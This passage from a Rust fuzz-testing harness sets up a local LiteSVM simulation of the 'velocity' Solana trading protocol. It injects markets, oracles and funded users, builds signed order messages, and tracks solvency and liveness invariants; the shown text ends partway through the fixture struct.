//! P7 `e2e-svm` — the crown-jewel stateful / coverage-guided Crucible harness.
//!
//! Loads the compiled velocity `.so` into LiteSVM, injects a coherent protocol
//! state (State + a USDC quote SpotMarket + a PerpMarket + funded users) via
//! account injection, then drives *real* instructions and checks the protocol's
//! global solvency / conservation invariants after every action.
//!
//! ## SVM integration path (both proven working; see the crate README/report)
//!  * `crucible_idl_gen::declare_fuzz_program!` ingests the full ~500 KB velocity
//!    IDL cleanly and gives us `register_schemas()` for semantic field-level diffs
//!    in crash output.
//!  * Instructions are built with `ctx.raw_call(Instruction{..})` using the IDL
//!    anchor discriminators + hand-encoded borsh args. This is uniform and avoids
//!    solana-version friction between the generated account structs and our deps.
//!  * Account reads / invariants use the velocity **host library** zero-copy
//!    structs via `ctx.read_zero_copy_account::<velocity::state::…>()` (velocity
//!    zero-copy structs are `bytemuck::Pod`), and the program's own authoritative
//!    helpers (`validate_spot_market_vault_amount`, `get_token_amount`).
//!  * Account *injection* uses `velocity::test_utils::get_anchor_account_bytes`
//!    (8-byte anchor discriminator + struct, alignment-correct) written straight
//!    into a program-owned account via the generic account builder.
//!
//! ## Setup coherence (verified against the deposit/withdraw handlers)
//!  * A SpotMarket with `oracle == Pubkey::default()` takes the hard-coded $1
//!    quote-asset price path — no oracle account required in `remaining_accounts`.
//!  * `status = Active`, `cumulative_{deposit,borrow}_interest = 1e10` (nonzero,
//!    else div-by-zero), `withdraw_guard_threshold = u64::MAX` (disables the twap
//!    withdraw limiter). Vault token authority = the `velocity_signer` PDA.

use {
    anchor_lang::AnchorSerialize,
    crucible_fuzzer::*,
    solana_instruction::{AccountMeta, Instruction},
    solana_keypair::Keypair,
    solana_pubkey::Pubkey,
    solana_signer::Signer,
    std::rc::Rc,
    velocity::{
        math::constants::{
            BASE_PRECISION, BASE_PRECISION_U64, MAX_CONCENTRATION_COEFFICIENT, PEG_PRECISION,
            PERCENTAGE_PRECISION, PRICE_PRECISION, QUOTE_PRECISION, SPOT_BALANCE_PRECISION,
            SPOT_CUMULATIVE_INTEREST_PRECISION, SPOT_UTILIZATION_PRECISION, SPOT_WEIGHT_PRECISION,
        },
        state::{
            market_status::MarketStatus,
            oracle::OracleSource,
            perp_market::{ContractTier, PerpMarket},
            pyth_lazer_oracle::PythLazerOracle,
            spot_market::{AssetTier, SpotBalanceType, SpotMarket},
            state::State,
            user::User,
        },
    },
};

// Generated types/schemas, read straight from the canonical IDL that the SDK
// also consumes. We only use `register_schemas()`; instruction building goes
// through `raw_call`.
crucible_idl_gen::declare_fuzz_program!(velocity_idl = "../../packages/sdk/src/idl/velocity.json");

// ---------------------------------------------------------------------------
// Constants
// ---------------------------------------------------------------------------

const VELOCITY_SO: &str = "../../target/deploy/velocity.so";

/// Number of funded users the fixture creates.
const NUM_USERS: usize = 2;
/// Number of funded-but-unbootstrapped authorities (see `Fixture::fresh`).
const NUM_FRESH: usize = 2;
/// Starting USDC (6 decimals) in each user's token account and the injected
/// budget we reconcile against.
const INITIAL_USDC: u64 = 1_000_000 * QUOTE_PRECISION as u64; // 1,000,000 USDC
/// Starting balance of spot-market-1's token (9 decimals) in each user's wallet.
const INITIAL_SOL: u64 = 1_000 * BASE_PRECISION_U64; // 1,000 units

// Anchor instruction discriminators (from the canonical IDL).
const D_INITIALIZE_USER_STATS: [u8; 8] = [254, 243, 72, 98, 251, 130, 168, 213];
const D_INITIALIZE_USER: [u8; 8] = [111, 17, 185, 250, 60, 122, 38, 254];
const D_DEPOSIT: [u8; 8] = [242, 35, 198, 137, 82, 225, 242, 182];
const D_WITHDRAW: [u8; 8] = [183, 18, 70, 156, 148, 109, 161, 34];
const D_PLACE_PERP_ORDER: [u8; 8] = [69, 161, 93, 202, 120, 126, 76, 185];
const D_CANCEL_ORDER: [u8; 8] = [95, 129, 237, 240, 8, 49, 223, 132];
const D_SETTLE_PNL: [u8; 8] = [43, 61, 234, 45, 15, 95, 152, 153];
// Order-management surface (all three take the same [state, user(w), authority(s)]).
const D_CANCEL_ORDERS: [u8; 8] = [238, 225, 95, 158, 227, 103, 8, 194];
const D_CANCEL_ORDERS_BY_IDS: [u8; 8] = [134, 19, 144, 165, 94, 240, 210, 94];
const D_CANCEL_ORDER_BY_USER_ID: [u8; 8] = [107, 211, 250, 133, 18, 37, 57, 100];
const D_MODIFY_ORDER: [u8; 8] = [47, 124, 117, 255, 201, 197, 130, 94];
const D_MODIFY_ORDER_BY_USER_ID: [u8; 8] = [158, 77, 4, 253, 252, 194, 161, 179];
const D_PLACE_ORDERS: [u8; 8] = [60, 63, 50, 123, 12, 197, 60, 190];
// User config setters ([user(w), authority(s)], except allow_delegate_transfer
// which takes [user_stats(w), authority(s)]).
const D_UPDATE_USER_CUSTOM_MARGIN_RATIO: [u8; 8] = [21, 221, 140, 187, 32, 129, 11, 123];
const D_UPDATE_USER_MARGIN_TRADING_ENABLED: [u8; 8] = [194, 92, 204, 223, 246, 188, 31, 203];
const D_UPDATE_USER_REDUCE_ONLY: [u8; 8] = [199, 71, 42, 67, 144, 19, 86, 109];
const D_UPDATE_USER_NAME: [u8; 8] = [135, 25, 185, 56, 165, 53, 34, 136];
const D_UPDATE_USER_POOL_ID: [u8; 8] = [219, 86, 73, 106, 56, 218, 128, 109];
const D_UPDATE_USER_DELEGATE: [u8; 8] = [139, 205, 141, 141, 113, 36, 94, 187];
const D_UPDATE_USER_ALLOW_DELEGATE_TRANSFER: [u8; 8] = [235, 106, 172, 39, 223, 238, 167, 204];
const D_UPDATE_USER_PERP_POSITION_CUSTOM_MARGIN_RATIO: [u8; 8] =
    [121, 137, 157, 155, 89, 186, 145, 113];
// Permissionless / keeper-style pokes that need no extra fixture state. Each
// takes [state, authority(s), filler(w), user(w)] (log_user_balances omits filler).
const D_UPDATE_USER_IDLE: [u8; 8] = [253, 133, 67, 22, 103, 161, 20, 100];
const D_FORCE_CANCEL_ORDERS: [u8; 8] = [64, 181, 196, 63, 222, 72, 64, 232];
const D_LOG_USER_BALANCES: [u8; 8] = [162, 21, 35, 251, 32, 57, 161, 210];
// Account lifecycle.
const D_DELETE_USER: [u8; 8] = [186, 85, 17, 249, 219, 231, 98, 251];
const D_RECLAIM_RENT: [u8; 8] = [218, 200, 19, 197, 227, 89, 192, 22];
// Fill engine + settlement/funding cranks (reachable once orders can cross and
// the oracle can move — see Fixture::perp_oracle_pda).
const D_FILL_PERP_ORDER: [u8; 8] = [13, 188, 248, 103, 134, 217, 106, 240];
const D_PLACE_AND_TAKE_PERP_ORDER: [u8; 8] = [213, 51, 1, 187, 108, 220, 230, 224];
const D_PLACE_AND_MAKE_PERP_ORDER: [u8; 8] = [149, 117, 11, 237, 47, 95, 89, 237];
const D_TRIGGER_ORDER: [u8; 8] = [63, 112, 51, 233, 232, 47, 240, 199];
const D_REVERT_FILL: [u8; 8] = [236, 238, 176, 69, 239, 10, 181, 193];
const D_SETTLE_MULTIPLE_PNLS: [u8; 8] = [127, 66, 117, 57, 40, 50, 152, 127];
const D_SETTLE_FUNDING_PAYMENT: [u8; 8] = [222, 90, 202, 94, 28, 45, 115, 183];
const D_UPDATE_FUNDING_RATE: [u8; 8] = [201, 178, 116, 212, 166, 144, 72, 238];
const D_UPDATE_PERP_BID_ASK_TWAP: [u8; 8] = [247, 23, 255, 65, 212, 90, 221, 194];
const D_UPDATE_AMMS: [u8; 8] = [201, 106, 217, 253, 4, 175, 228, 97];
// Insurance-fund staking lifecycle.
const D_INITIALIZE_IF_STAKE: [u8; 8] = [187, 179, 243, 70, 248, 90, 92, 147];
const D_ADD_IF_STAKE: [u8; 8] = [251, 144, 115, 11, 222, 47, 62, 236];
const D_REQUEST_REMOVE_IF_STAKE: [u8; 8] = [142, 70, 204, 92, 73, 106, 180, 52];
const D_CANCEL_REQUEST_REMOVE_IF_STAKE: [u8; 8] = [97, 235, 78, 62, 212, 42, 241, 127];
const D_REMOVE_IF_STAKE: [u8; 8] = [128, 166, 142, 9, 254, 187, 143, 174];
// Revenue / fee plumbing.
const D_DEPOSIT_INTO_REVENUE_POOL: [u8; 8] = [92, 40, 151, 42, 122, 254, 139, 246];
const D_SETTLE_REVENUE_TO_IF: [u8; 8] = [200, 120, 93, 136, 69, 38, 199, 159];
const D_SWEEP_PERP_MARKET_FEES: [u8; 8] = [194, 147, 181, 230, 193, 155, 241, 225];
const D_UPDATE_SPOT_MARKET_CUMULATIVE_INTEREST: [u8; 8] = [39, 166, 139, 243, 158, 165, 155, 225];
// Sub-account transfers.
const D_TRANSFER_DEPOSIT: [u8; 8] = [20, 20, 147, 223, 41, 63, 204, 111];
const D_TRANSFER_PERP_POSITION: [u8; 8] = [23, 172, 188, 168, 134, 210, 3, 108];
const D_TRANSFER_DEPOSIT_BY_DELEGATE: [u8; 8] = [141, 171, 241, 161, 17, 31, 135, 29];
// Account bootstrap for a fresh authority (covers the init handlers at runtime).
const D_INITIALIZE_REFERRER_NAME: [u8; 8] = [235, 126, 231, 10, 42, 164, 26, 61];
// Keeper pokes.
const D_PAUSE_SPOT_MARKET_DEPOSIT_WITHDRAW: [u8; 8] = [183, 119, 59, 170, 137, 35, 242, 86];
const D_TRIP_EQUITY_FLOOR_BREAKER: [u8; 8] = [133, 184, 25, 80, 193, 52, 162, 249];
const D_FORCE_DELETE_USER: [u8; 8] = [2, 241, 195, 172, 227, 24, 254, 158];
const D_UPDATE_USER_QUOTE_ASSET_IF_STAKE: [u8; 8] = [251, 101, 156, 7, 2, 63, 30, 23];
// Spot market 1 / cross-market: liquidation, swaps, pool migration.
const D_LIQUIDATE_SPOT: [u8; 8] = [107, 0, 128, 41, 35, 229, 251, 18];
const D_LIQUIDATE_BORROW_FOR_PERP_PNL: [u8; 8] = [169, 17, 32, 90, 207, 148, 209, 27];
const D_BEGIN_SWAP: [u8; 8] = [174, 109, 228, 1, 242, 105, 232, 105];
const D_END_SWAP: [u8; 8] = [177, 184, 27, 193, 34, 13, 210, 145];
const D_LIQUIDATE_SPOT_WITH_SWAP_BEGIN: [u8; 8] = [12, 43, 176, 83, 156, 251, 117, 13];
const D_LIQUIDATE_SPOT_WITH_SWAP_END: [u8; 8] = [142, 88, 163, 160, 223, 75, 55, 225];
const D_TRANSFER_POOLS: [u8; 8] = [197, 103, 154, 25, 107, 90, 60, 94];
// Bankruptcy resolution. Neither was reachable from this harness before, so the
// whole waterfall in controller/liquidation.rs (pending_if_fee tranche, the
// shared IF vault draw, the AMM clawback, and socialization onto depositors) was
// 0% covered here.
const D_RESOLVE_PERP_BANKRUPTCY: [u8; 8] = [224, 16, 176, 214, 162, 213, 183, 222];
const D_RESOLVE_SPOT_BANKRUPTCY: [u8; 8] = [124, 194, 240, 254, 198, 213, 52, 122];
// Signed-message account lifecycle: plain account create/resize/delete.
// (The ORDER-placing signed-msg instructions additionally need an ed25519
// pre-instruction — see `build_signed_msg_envelope`.)
const D_INIT_SIGNED_MSG_USER_ORDERS: [u8; 8] = [164, 99, 156, 126, 156, 57, 99, 180];
const D_RESIZE_SIGNED_MSG_USER_ORDERS: [u8; 8] = [137, 10, 87, 150, 18, 115, 79, 168];
const D_DELETE_SIGNED_MSG_USER_ORDERS: [u8; 8] = [221, 247, 128, 253, 212, 254, 46, 153];
/// Pyth Lazer feed ids for the two oracle accounts. These are the PDA seeds
/// (`[PYTH_LAZER_ORACLE_SEED, feed_id.to_le_bytes()]`) and also the `feed_id`
/// carried in a signed price update, so the two must agree.
const PERP_FEED_ID: u32 = 0;
const SPOT_1_FEED_ID: u32 = 1;

const D_UPDATE_AMM_CACHE: [u8; 8] = [88, 4, 63, 94, 83, 224, 255, 130];
const D_UPDATE_USER_EQUITY_FLOOR: [u8; 8] = [49, 87, 139, 119, 136, 239, 186, 104];
const D_UPDATE_PYTH_LAZER_ORACLE: [u8; 8] = [218, 237, 170, 245, 39, 143, 166, 33];

/// A Lazer `SolanaMessage` prefixes its envelope with a 4-byte format magic, so
/// every offset inside it is shifted by 4 relative to the signed-msg layout.
const LAZER_MAGIC_LEN: u16 = 4;
const D_PLACE_SIGNED_MSG_TAKER_ORDER: [u8; 8] = [32, 79, 101, 139, 25, 6, 98, 15];
const D_PLACE_AND_MAKE_SIGNED_MSG_PERP_ORDER: [u8; 8] = [16, 26, 123, 131, 94, 29, 175, 98];
const D_INIT_SIGNED_MSG_WS_DELEGATES: [u8; 8] = [40, 132, 96, 219, 184, 193, 80, 8];
const D_CHANGE_SIGNED_MSG_WS_DELEGATE: [u8; 8] = [252, 202, 252, 219, 179, 27, 84, 138];
// Revenue-share / builder-code escrow lifecycle.
const D_INIT_REVENUE_SHARE: [u8; 8] = [57, 9, 123, 131, 82, 52, 50, 13];
const D_INIT_REVENUE_SHARE_ESCROW: [u8; 8] = [187, 18, 123, 88, 238, 104, 84, 154];
const D_RESIZE_REVENUE_SHARE_ESCROW: [u8; 8] = [32, 124, 247, 225, 151, 213, 225, 38];
const D_CHANGE_APPROVED_BUILDER: [u8; 8] = [179, 134, 211, 45, 195, 5, 189, 173];
// NOTE: `handle_update_user_stats_referrer_info` is exposed under a DIFFERENT
// instruction name (`update_user_stats_referrer_status`), which is why a lookup
// by handler name finds nothing in the IDL.
const D_UPDATE_USER_STATS_REFERRER_STATUS: [u8; 8] = [174, 154, 72, 42, 191, 148, 145, 205];
const D_SPECIAL_TRANSFER_PERP_TO_VAMM: [u8; 8] = [39, 111, 187, 243, 18, 139, 223, 1];
// Isolated perp positions (devnet feature flavour: isolated-position enabled).
const D_DEPOSIT_INTO_ISOLATED: [u8; 8] = [101, 48, 255, 153, 127, 121, 170, 26];
const D_WITHDRAW_FROM_ISOLATED: [u8; 8] = [37, 92, 178, 149, 140, 76, 159, 135];
const D_TRANSFER_ISOLATED_DEPOSIT: [u8; 8] = [201, 131, 242, 228, 85, 226, 70, 237];
// Protocol fee withdrawal (guarded by the FeeWithdraw hot role).
const D_WITHDRAW_PROTOCOL_FEES_PERP: [u8; 8] = [227, 99, 23, 227, 168, 217, 136, 181];
const D_WITHDRAW_PROTOCOL_FEES_SPOT: [u8; 8] = [177, 216, 30, 239, 253, 177, 123, 155];

// System / builtin program ids.
fn system_program_id() -> Pubkey {
    Pubkey::new_from_array([0u8; 32])
}
fn rent_sysvar_id() -> Pubkey {
    Pubkey::from_str_const("SysvarRent111111111111111111111111111111111")
}
fn clock_sysvar_id() -> Pubkey {
    Pubkey::from_str_const("SysvarC1ock11111111111111111111111111111111")
}
/// A bare SPL-Token `Transfer` (tag 3): `[source(w), destination(w), authority(s)]`.
///
/// Used to simulate the EXTERNAL swap that the protocol brackets between
/// `begin_swap` and `end_swap`. Without it `amount_out` is 0 and `end_swap`
/// always rejects with `InvalidSwap` ("amount_out must be greater than 0"), so
/// the whole swap surface stays unreachable no matter what the fuzzer does.
/// ComputeBudget `SetComputeUnitLimit` (tag 2).
///
/// `transfer_pools` walks four spot markets plus the perp market and both
/// oracles, and blows the default 200k budget — it fails with
/// `ProgramFailedToComplete` partway through rather than at any guard, which
/// looks like a logic rejection but is just CU exhaustion.
fn compute_budget_ix(units: u32) -> Instruction {
    let mut data = vec![2u8];
    data.extend_from_slice(&units.to_le_bytes());
    Instruction {
        program_id: Pubkey::from_str_const("ComputeBudget111111111111111111111111111111"),
        accounts: vec![],
        data,
    }
}

fn spl_transfer_ix(
    source: Pubkey,
    destination: Pubkey,
    authority: Pubkey,
    amount: u64,
) -> Instruction {
    let mut data = vec![3u8];
    data.extend_from_slice(&amount.to_le_bytes());
    Instruction {
        program_id: token_program_id(),
        accounts: vec![
            AccountMeta::new(source, false),
            AccountMeta::new(destination, false),
            AccountMeta::new_readonly(authority, true),
        ],
        data,
    }
}

fn instructions_sysvar_id() -> Pubkey {
    Pubkey::from_str_const("Sysvar1nstructions1111111111111111111111111")
}
fn ed25519_program_id() -> Pubkey {
    Pubkey::from_str_const("Ed25519SigVerify111111111111111111111111111")
}

// ---------------------------------------------------------------------------
// Signed-message ("swift") envelope construction
// ---------------------------------------------------------------------------
//
// `place_signed_msg_taker_order` authenticates an *off-chain* order: the taker
// signs the order params with their wallet key, a keeper relays it, and the
// program proves authenticity by cross-checking a native Ed25519Program
// instruction that must sit immediately before it in the same transaction.
//
// That is why this whole surface read 0% until now — it is not reachable with a
// single instruction, no matter what the fuzzer mutates. The envelope has to be
// byte-exact, because `verify_and_decode_ed25519_msg` re-derives every offset
// and rejects on any mismatch.
//
// The message the program is handed (`signed_msg_order_params_message_bytes`)
// is self-framing — the signature, the signer and the payload all live inside
// it, and the Ed25519Program instruction merely *points* at them:
//
//     msg[  0.. 64]  ed25519 signature over msg[98..]
//     msg[ 64.. 96]  signer pubkey (taker authority, or delegate)
//     msg[ 96.. 98]  u16 LE length of the payload that follows
//     msg[ 98..  N]  ASCII-hex of (8-byte manual discriminator || borsh message)
//
// The hex layer is not decoration: the program calls `hex::decode` on the
// payload before borsh-deserializing it, so the bytes that actually get *signed*
// are the hex characters, not the borsh bytes.
const SIGNED_MSG_SIG_OFF: u16 = 0;
const SIGNED_MSG_PUBKEY_OFF: u16 = 64;
const SIGNED_MSG_SIZE_OFF: u16 = 96;
const SIGNED_MSG_PAYLOAD_OFF: u16 = 98;

/// Offset of the message within the velocity instruction's data:
/// 8-byte anchor discriminator + 4-byte borsh `Vec<u8>` length prefix.
const SIGNED_MSG_IX_DATA_OFF: u16 = 12;

fn hex_encode(bytes: &[u8]) -> Vec<u8> {
    const D: &[u8; 16] = b"0123456789abcdef";
    let mut out = Vec::with_capacity(bytes.len() * 2);
    for b in bytes {
        out.push(D[(b >> 4) as usize]);
        out.push(D[(b & 0x0f) as usize]);
    }
    out
}

/// Build the native Ed25519Program instruction that authenticates the velocity
/// instruction at `velocity_ix_index` within the same transaction.
///
/// All three `*_instruction_index` fields point at the *velocity* instruction
/// (not at this one): the precompile reads the signature, pubkey and message
/// out of the relayed instruction's data. `verify_and_decode_ed25519_msg`
/// independently recomputes each of these offsets and rejects any that differ,
/// so they have to be derived from the same layout constants above.
fn ed25519_verify_ix(velocity_ix_index: u16, payload_len: u16) -> Instruction {
    let mut data = Vec::with_capacity(16);
    data.push(1u8); // number of signatures
    data.push(0u8); // padding
    let base = SIGNED_MSG_IX_DATA_OFF;
    for v in [
        base + SIGNED_MSG_SIG_OFF,
        velocity_ix_index,
        base + SIGNED_MSG_PUBKEY_OFF,
        velocity_ix_index,
        base + SIGNED_MSG_PAYLOAD_OFF,
        payload_len,
        velocity_ix_index,
    ] {
        data.extend_from_slice(&v.to_le_bytes());
    }
    Instruction {
        program_id: ed25519_program_id(),
        accounts: vec![],
        data,
    }
}

/// Assemble the self-framing signed message described above.
///
/// `borsh_message` is the already-serialized `SignedMsgOrderParamsMessage` (or
/// its delegate variant); the 8-byte manual discriminator is prepended here
/// because `deserialize_into_verified_message` skips exactly 8 bytes before
/// handing the rest to borsh — the value itself is never inspected.
fn build_signed_msg_envelope(signer: &Keypair, borsh_message: &[u8]) -> Vec<u8> {
    let mut payload = vec![0u8; 8]; // manual discriminator (unchecked by the program)
    payload.extend_from_slice(borsh_message);
    let hex_payload = hex_encode(&payload);

    let signature = signer.sign_message(&hex_payload);

    let mut msg = Vec::with_capacity(SIGNED_MSG_PAYLOAD_OFF as usize + hex_payload.len());
    msg.extend_from_slice(signature.as_ref());
    msg.extend_from_slice(&signer.pubkey().to_bytes());
    msg.extend_from_slice(&(hex_payload.len() as u16).to_le_bytes());
    msg.extend_from_slice(&hex_payload);
    msg
}
fn token_program_id() -> Pubkey {
    Pubkey::new_from_array(anchor_spl::token::ID.to_bytes())
}

fn velocity_program_id() -> Pubkey {
    Pubkey::new_from_array(velocity::ID.to_bytes())
}

// ---------------------------------------------------------------------------
// Helpers
// ---------------------------------------------------------------------------

fn ix_data(disc: [u8; 8], args: &[u8]) -> Vec<u8> {
    let mut v = Vec::with_capacity(8 + args.len());
    v.extend_from_slice(&disc);
    v.extend_from_slice(args);
    v
}

/// Borsh `Option<T>`: a 1-byte tag (0 = None, 1 = Some) then the payload.
fn push_opt(buf: &mut Vec<u8>, some: bool, payload: &[u8]) {
    if some {
        buf.push(1);
        buf.extend_from_slice(payload);
    } else {
        buf.push(0);
    }
}

/// `push_opt` for a single-byte payload (enum discriminants, bools, u8s).
fn push_opt_u8(buf: &mut Vec<u8>, some: bool, value: u8) {
    push_opt(buf, some, &[value]);
}

/// Hand-encode `ModifyOrderParams`. Every field is an `Option`, and the wire
/// order must match the struct declaration order in
/// `velocity::state::order_params::ModifyOrderParams`:
///   direction, base_asset_amount, price, reduce_only, post_only, bit_flags,
///   max_ts, trigger_price, trigger_condition, oracle_price_offset,
///   activation_delay_slots, policy.
/// The fields this harness does not drive are always `None`.
#[allow(clippy::too_many_arguments)]
fn modify_params_bytes(
    with_direction: bool,
    direction: u8,
    with_base: bool,
    base: u64,
    with_price: bool,
    price: u64,
    with_reduce_only: bool,
    reduce_only: bool,
    with_policy: bool,
    policy: u8,
) -> Vec<u8> {
    let mut b = Vec::new();
    push_opt_u8(&mut b, with_direction, direction);
    push_opt(&mut b, with_base, &base.to_le_bytes());
    push_opt(&mut b, with_price, &price.to_le_bytes());
    push_opt_u8(&mut b, with_reduce_only, reduce_only as u8);
    push_opt_u8(&mut b, false, 0); // post_only
    push_opt_u8(&mut b, false, 0); // bit_flags
    push_opt(&mut b, false, &[]); // max_ts
    push_opt(&mut b, false, &[]); // trigger_price
    push_opt_u8(&mut b, false, 0); // trigger_condition
    push_opt(&mut b, false, &[]); // oracle_price_offset
    push_opt(&mut b, false, &[]); // activation_delay_slots
    push_opt_u8(&mut b, with_policy, policy);
    b
}

/// Inject an anchor zero-copy account (discriminator + struct) at `pda`, owned
/// by the velocity program, with plenty of lamports.
fn inject<T>(ctx: &mut TestContext, pda: Pubkey, acct: &mut T)
where
    T: bytemuck::Pod + anchor_lang::ZeroCopy + anchor_lang::Owner,
{
    let bytes = velocity::test_utils::get_anchor_account_bytes(acct);
    ctx.create_account()
        .pubkey(pda)
        .owner(velocity_program_id())
        .lamports(1_000_000_000)
        .data(&bytes)
        .create()
        .expect("inject account");
}

/// Inject the `AmmCache` — the one account in the fixture that is *not* a plain
/// zero-copy struct.
///
/// `AmmCache` is a borsh `#[account]` with a `Vec<CacheInfo>` tail that the
/// program then reads back **zero-copy** through `load_zc_mut`, so `inject()`
/// cannot build it: the on-wire layout the loader expects is
/// `[8 disc][AmmCacheFixed: bump u8 + pad[3] + len u32][len * CacheInfo]`,
/// with no borsh framing around the elements. Building those bytes by hand is
/// what makes `update_amm_cache` reachable at all — there is no permissionless
/// instruction that creates this account (only the admin `initialize_amm_cache`
/// / `add_market_to_amm_cache` pair).
///
/// `oracle` / `oracle_source` must match the perp market's exactly, or the
/// handler's first `validate!` rejects with "oracle id mismatch".
fn inject_amm_cache(ctx: &mut TestContext, pda: Pubkey, entries: &[(u16, Pubkey, u8)]) {
    use {
        anchor_lang::Discriminator,
        velocity::vlp::amm_cache::{AmmCache, CacheInfo},
    };

    let mut bytes = AmmCache::DISCRIMINATOR.to_vec();
    bytes.push(255); // bump — never re-derived on this path
    bytes.extend_from_slice(&[0u8; 3]);
    bytes.extend_from_slice(&(entries.len() as u32).to_le_bytes());
    for (market_index, oracle, oracle_source) in entries {
        let info = CacheInfo {
            market_index: *market_index,
            oracle: anchor_pk(*oracle),
            oracle_source: *oracle_source,
            ..CacheInfo::default()
        };
        bytes.extend_from_slice(bytemuck::bytes_of(&info));
    }
    ctx.create_account()
        .pubkey(pda)
        .owner(velocity_program_id())
        .lamports(1_000_000_000)
        .data(&bytes)
        .create()
        .expect("inject amm cache");
}

/// Inject the Pyth Lazer `Storage` account that `update_pyth_lazer_oracle`
/// authenticates against.
///
/// The handler pins this account by address only (`PYTH_LAZER_STORAGE_ID`) and
/// then `Storage::try_deserialize`s it, so it needs the right discriminator and
/// borsh body but no particular owner. `trusted_signer` is the key the harness
/// signs updates with; `expires_at` must be in the future or every message is
/// rejected as `NotTrustedSigner`.
fn inject_pyth_lazer_storage(ctx: &mut TestContext, trusted_signer: Pubkey, expires_at: i64) {
    use {
        anchor_lang::{AnchorSerialize, Discriminator},
        pyth_lazer::storage::{Storage, TrustedSignerInfo, SPACE_FOR_TRUSTED_SIGNERS},
    };

    let mut trusted_signers = [TrustedSignerInfo::default(); SPACE_FOR_TRUSTED_SIGNERS];
    trusted_signers[0] = TrustedSignerInfo {
        pubkey: anchor_pk(trusted_signer),
        expires_at,
    };
    let storage = Storage {
        top_authority: anchor_pk(trusted_signer),
        treasury: anchor_pk(trusted_signer),
        single_update_fee_in_lamports: 0,
        num_trusted_signers: 1,
        trusted_signers,
        _extra_space: [0u8; pyth_lazer::storage::EXTRA_SPACE],
    };

    let mut bytes = Storage::DISCRIMINATOR.to_vec();
    storage.serialize(&mut bytes).expect("serialize storage");
    ctx.create_account()
        .pubkey(Pubkey::new_from_array(
            velocity::state::pyth_lazer_oracle::PYTH_LAZER_STORAGE_ID.to_bytes(),
        ))
        .owner(system_program_id())
        .lamports(1_000_000_000)
        .data(&bytes)
        .create()
        .expect("inject pyth lazer storage");
}

/// Which market's guard rails classify a given injected oracle.
///
/// The confidence bound is NOT a property of the oracle account — it is
/// `guard_rails.confidence_interval_max_size * market.max_confidence_interval_multiplier`,
/// and the perp and spot multiplier tables are DIFFERENT. Binding the oracle to
/// its owning market here makes a mismatched (oracle, multiplier) pair
/// unrepresentable rather than merely discouraged; two of the call sites sit in
/// the same boolean chain and need different multipliers, which is exactly the
/// asymmetry a shared constant would erase.
#[derive(Clone, Copy)]
enum OracleOwner {
    Perp,
    Spot1,
}

#[derive(Clone)]
struct UserAcct {
    keypair: Rc<Keypair>,
    user_pda: Pubkey,
    stats_pda: Pubkey,
    /// Token account for spot market 0's mint (quote, 6 decimals).
    token_account: Pubkey,
    /// Token account for spot market 1's mint (borrowable, 9 decimals).
    token_account_1: Pubkey,
}

#[derive(Clone)]
struct Fixture {
    ctx: TestContext,
    program_id: Pubkey,
    signer_pda: Pubkey,
    usdc_mint: Pubkey,
    spot_market_pda: Pubkey,
    spot_vault_pda: Pubkey,
    if_vault_pda: Pubkey,
    perp_market_pda: Pubkey,
    /// The perp market's oracle: a velocity-owned `PythLazerOracle` account.
    ///
    /// This is what makes the perp side of the harness *priceable*. Previously
    /// the perp market used `oracle == Pubkey::default()` +
    /// `OracleSource::QuoteAsset`, which takes the hard-coded $1 path: no oracle
    /// account is ever loaded and the price can never move, so funding, TWAPs,
    /// AMM updates, oracle-validity gating and price-driven liquidation were all
    /// unreachable. `OracleMap::load` accepts a velocity-owned account whose
    /// discriminator is `PythLazerOracle`'s, so we can inject one directly (no
    /// external oracle program needed) and rewrite its price host-side.
    perp_oracle_pda: Pubkey,
    // ---- spot market 1: a non-quote, oracle-priced, borrowable market -------
    //
    // Everything the harness previously did lived on ONE quote market whose
    // price is a hard-coded $1 and whose asset/liability weights are 1.0. With a
    // single market at a fixed price a user can never become undercollateralized
    // by holding it, so the whole spot-liquidation family (`liquidate_spot`,
    // `liquidate_borrow_for_perp_pnl`, `liquidate_spot_with_swap_*`), the swap
    // path, `transfer_pools`, and real interest accrual were unreachable by
    // construction. Market 1 is a 9-decimal asset with its own movable
    // PythLazer oracle and weights < 1.0, so: deposit market 0, borrow market 1,
    // move the oracle, and the account is genuinely liquidatable.
    sol_mint: Pubkey,
    spot_market_1_pda: Pubkey,
    spot_vault_1_pda: Pubkey,
    if_vault_1_pda: Pubkey,
    spot_1_oracle_pda: Pubkey,
    /// Spot markets 2 and 3, both in POOL 1.
    ///
    /// `transfer_pools` requires `from_user.pool_id != to_user.pool_id` and four
    /// DISTINCT vaults (anchor rejects the same mutable account twice), so with
    /// only pool-0 markets 0 and 1 it could never get past its constraints —
    /// 211 lines of handler sat at 1.4%. These two are deliberately minimal:
    /// QuoteAsset ($1, no oracle account needed) and weights of 1.0, because
    /// their job is to be a valid *destination pool*, not to be traded.
    pool1_market_a_pda: Pubkey,
    pool1_vault_a_pda: Pubkey,
    pool1_market_b_pda: Pubkey,
    pool1_vault_b_pda: Pubkey,
    /// The VLP `AmmCache`, injected (see `inject_amm_cache`).
    amm_cache_pda: Pubkey,
    crank: Rc<Keypair>,
    /// Warm admin (see `build_state`). Used only to establish preconditions that
    /// no permissionless instruction can create, never as a fuzzed identity.
    admin: Rc<Keypair>,
    users: Vec<UserAcct>,
    /// Funded authorities with NO on-chain User/UserStats yet.
    ///
    /// The fixture's own users are bootstrapped during `setup()`, which runs
    /// before coverage tracing starts — so `initialize_user_stats` /
    /// `initialize_user` read as never-executed no matter how many users are
    /// built. These spare authorities let the *actions* perform a real account
    /// bootstrap inside a traced iteration.
    fresh: Vec<Rc<Keypair>>,
    /// Monotonic mm-oracle sequence id for the native update path.
    mm_seq: u64,
    /// Monotonic publish_time for injected oracle updates (becomes the oracle's
    /// `sequence_id`, which some validity paths require to be increasing).
    oracle_seq: u64,
    /// Cranks that FAILED while their preconditions were met.
    ///
    /// A permissionless crank that reverts when it should have run is a
    /// liveness break, not a harmless no-op: the protocol depends on anyone
    /// being able to advance funding, interest and AMM state. Recorded here by
    /// the crank actions and asserted empty by the invariant. (Modelled on the
    /// phoenix harness's "effect-liveness" checks.)
    crank_failures: Vec<&'static str>,
    /// Liquidations that the protocol REFUSED (error 6004 SufficientCollateral)
    /// against a victim that is structurally insolvent. See Family XVIII.
    liq_refusals: Vec<&'static str>,
    /// Last observed `(cumulative_deposit_interest, cumulative_borrow_interest,
    /// total_social_loss)` per spot market, for the monotonicity invariant.
    /// `None` until the first observation, so the check never fires on the very
    /// first sample (an initial-state false positive). `total_social_loss` is
    /// carried because it is the exact witness for the one LAWFUL decrease of
    /// the deposit index — see the invariant.
    last_interest: [Option<(u128, u128, u128)>; 2],
